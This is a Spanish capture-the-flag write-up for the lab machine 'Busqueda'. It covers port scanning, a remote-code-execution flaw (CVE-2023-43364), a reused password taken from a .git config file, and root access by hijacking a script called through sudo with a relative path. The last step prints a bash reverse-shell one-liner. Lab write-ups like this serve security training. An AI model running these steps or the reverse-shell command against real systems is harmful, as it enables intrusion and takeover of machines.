<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Busqueda</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Busqueda</h1><br/><p><ol><li>Hago un escaneo de puertos<strong> nmap -sV -sC -p- --open 10.10.11.208 -T4 -A -vv -oN scan.txt</strong></li><li>Añado la dirección IP a<strong> /etc/hosts</strong></li><li>A primera vista es como un searcher por lo que creo que hace la busqueda directamente en bd.</li><li>Posible <strong>SQLI</strong></li><li>Intercepto la solicitud con<strong> Burpsuite</strong></li><li>El buscador hace una solicitud php </li></ol><img src="images/87-1.png" alt="images/87-1.png" /><ol><li>Al final de la página encuentro una versión </li></ol><img src="images/87-2.png" alt="images/87-2.png" /><ol><li>La pagina es un buscador que genra url para una cantidad de motores de búsqueda</li><li>Es sensible a <strong>RCE</strong>. Vuln <strong>CVE-2023-43364</strong></li><li>Obtengo reverse shell  </li></ol><img src="images/87-3.png" alt="images/87-3.png" /><ol><li>Encuentro la flag user</li><li>Una vez tenemos acceso a la máquina tendremos que hacer footprint para buscar una posible privesc</li><li>Normalmente suelo empezar a enumerar por donde está la web</li><li>En un archivo <strong>config</strong> dentro de <strong>.git</strong> encuentro una pass que me sirve para conectarme a través de <strong>SSH</strong> </li></ol><img src="images/87-4.png" alt="images/87-4.png" /><ol><li>Esto también me sirve para mejorar la conexión</li><li>Con estas credenciales que obtuve entro con SSH </li></ol><img src="images/87-5.png" alt="images/87-5.png" /><ol><li>Haciendo un sudo -l encuentro que puedo ejecutar como root un comando </li></ol><img src="images/87-6.png" alt="images/87-6.png" /><ol><li>Tras informarme un poco sobre el comando consigo ejecutarlo como root </li></ol><img src="images/87-7.png" alt="images/87-7.png" /><ol><li>No tenemos permisos para editar estos archivos </li></ol><img src="images/87-8.png" alt="images/87-8.png" /><ol><li>Puede que si borro full-checkup y creo otro archivo consiga que ese archivo se ejecute como root</li><li>No me deja borrarlo. Si el script no tiene la ruta entera puede que cree otro archivo en el directorio local y se ejecute mi script en vez de otra</li><li>Estaba teniendo errores por que no le asigné permisos de ejecución a la script </li></ol><img src="images/87-9.png" alt="images/87-9.png" /><ol><li>Meto el reverse shell dentro de la script y obtengo root <strong>bash -i &gt;&amp; /dev/tcp/&lt;YourIP&gt;/&lt;PORT&gt; 0&gt;&amp;1</strong></li></ol></p></div>
</body>
</html>
